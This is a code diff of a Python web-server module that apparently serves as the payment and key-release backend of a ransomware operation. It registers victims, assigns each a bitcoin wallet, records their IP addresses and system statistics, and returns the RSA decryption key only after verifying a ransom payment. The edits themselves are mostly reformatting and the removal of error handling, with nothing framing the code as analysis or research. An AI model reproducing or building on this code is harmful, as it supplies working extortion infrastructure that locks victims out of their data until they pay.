@@ -1,6 +1,7 @@
 import logging
 import requests
 import ipaddress
+import random
 from asymmetric_encryption import RSA
 from base64 import b64encode, b64decode
 from payment import verify_payment, generate_bitcoin_address
@@ -19,7 +20,7 @@ def decrypt_rsa_data(encrypted_key):
 
     Returns:
         dict: A dict with decrypted key
-    """    
+    """
     logger.info("Decrypting RSA data")
     cipher = RSA()
     unencrypted_local_private_key = b"".join(
@@ -38,14 +39,16 @@ def unpack_decrypt_request(request_parameters):
 
     Returns:
         tuple: A set with all the parametrs as individual elemnts which can be unpacked
-    """    
+    """
     logger.info("Unpacking decrypt request")
     client_id = request_parameters.get("client_id")
-    private_key = [
-        b64decode(part) for part in request_parameters.get("private_key")
-    ]
-    assigned_wallet_address = b64decode(request_parameters.get("assigned_wallet_address")).decode()
-    payee_wallet_address = b64decode(request_parameters.get("payee_wallet_address")).decode()
+    private_key = [b64decode(part) for part in request_parameters.get("private_key")]
+    assigned_wallet_address = b64decode(
+        request_parameters.get("assigned_wallet_address")
+    ).decode()
+    payee_wallet_address = b64decode(
+        request_parameters.get("payee_wallet_address")
+    ).decode()
     return client_id, private_key, assigned_wallet_address, payee_wallet_address
 
 
@@ -64,10 +67,6 @@ def unpack_initialise_request(request_parameters):
     return client_id, statistics
 
 
-def the_error_message():
-    return {"fun":"quote"}
-
-
 def format_and_insert_statistics_to_database(client_id, statistics, request):
     """Format statistics data
 
@@ -75,7 +74,7 @@ def format_and_insert_statistics_to_database(client_id, statistics, request):
         client_id (str): Unique client id
         statistics (dict): Various info about client
         request (flask.request): The incoming request object 
-    """    
+    """
     statistics["client_id"] = client_id
     if request.headers.getlist("X-Forwarded-For"):
         ip = ipaddress.ip_address(request.headers.getlist("X-Forwarded-For")[0])
@@ -84,7 +83,7 @@ def format_and_insert_statistics_to_database(client_id, statistics, request):
 
     statistics["ip_address"] = str(ip)
     insert_statistics_to_database(statistics)
-    
+
 
 def process_request(request, request_type):
     """Acts as a driver function to process requests
@@ -95,20 +94,17 @@ def process_request(request, request_type):
 
     Returns:
         dict: The response with various parameters included
-    """    
-    try:
-        parameters = request.get_json()
-        if request_type == "initialise" and validate_initialisation_request(parameters):
-            client_id, statistics = unpack_initialise_request(parameters)
-            wallet_id = generate_bitcoin_address(client_id)
-            format_and_insert_statistics_to_database(client_id, statistics, request)
-            return {"client_id": client_id, "wallet_id": wallet_id}
-
-        elif request_type == "decrypt" and validate_decryption_request(parameters):
-            client_id, private_key, assigned_wallet_address, payee_wallet_address = unpack_decrypt_request(parameters)
-            if verify_payment(client_id, assigned_wallet_address, payee_wallet_address):
-                return decrypt_rsa_data(private_key)
+    """
     
-    except Exception as err:
-        logger.error(f"Exception occured:{err}")
-        return the_error_message()
+    parameters = request.get_json()
+    if request_type == "initialise" and validate_initialisation_request(parameters):
+        client_id, statistics = unpack_initialise_request(parameters)
+        wallet_id = generate_bitcoin_address(client_id)
+        format_and_insert_statistics_to_database(client_id, statistics, request)
+        return {"client_id": client_id, "wallet_id": wallet_id}
+
+    elif request_type == "decrypt" and validate_decryption_request(parameters):
+        client_id, private_key, assigned_wallet_address, payee_wallet_address = unpack_decrypt_request(parameters)
+        if verify_payment(client_id, assigned_wallet_address, payee_wallet_address):
+            return decrypt_rsa_data(private_key)
+
